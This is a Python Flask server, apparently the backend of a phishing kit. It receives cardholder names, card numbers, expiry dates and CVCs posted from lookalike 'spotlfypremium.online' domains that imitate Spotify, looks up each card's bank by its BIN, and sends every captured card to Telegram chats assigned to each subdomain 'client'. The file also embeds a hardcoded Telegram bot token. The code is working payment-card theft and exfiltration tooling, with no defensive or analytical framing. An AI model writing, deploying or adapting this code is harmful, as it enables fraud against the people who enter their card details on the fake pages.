import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# ESTO ES VITAL: Permite que cualquier dominio (tus subdominios) le hable al servidor
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- MAPA DE CLIENTES ---
CLIENTES_MAPA = {
    'spotlfypremium.online': ['6953415010', '7707049896'],
    'cliente1.spotlfypremium.online': ['7707049896'],
    'free.spotlfypremium.online': ['-1087968824', '1087968824'], 
    'promo.spotlfypremium.online': ['123456789'],
    'juan.spotlfypremium.online': ['987654321'],
}

def get_bank_info_pro(card_number):
    bin_number = card_number[:6]
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank} | {type_card} | {country}"
        return "🏦 Banco: Desconocido"
    except:
        return "🏦 Error de conexión"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    # Detectar el dominio exacto que está llamando al servidor
    host_recibido = request.headers.get('Host', '').split(':')[0]
    print(f"🌐 PETICIÓN RECIBIDA DESDE: {host_recibido}")

    lista_destinatarios = CLIENTES_MAPA.get(host_recibido)

    if not lista_destinatarios:
        print(f"🚫 DOMINIO NO AUTORIZADO: {host_recibido}")
        return jsonify({"status": "ignored"}), 200

    data = request.json
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    info_banco = get_bank_info_pro(tarjeta)

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *ORIGEN:* `{host_recibido}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    for id_receptor in lista_destinatarios:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"🏁 Finalizado. Enviados a {exitos} personas desde {host_recibido}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
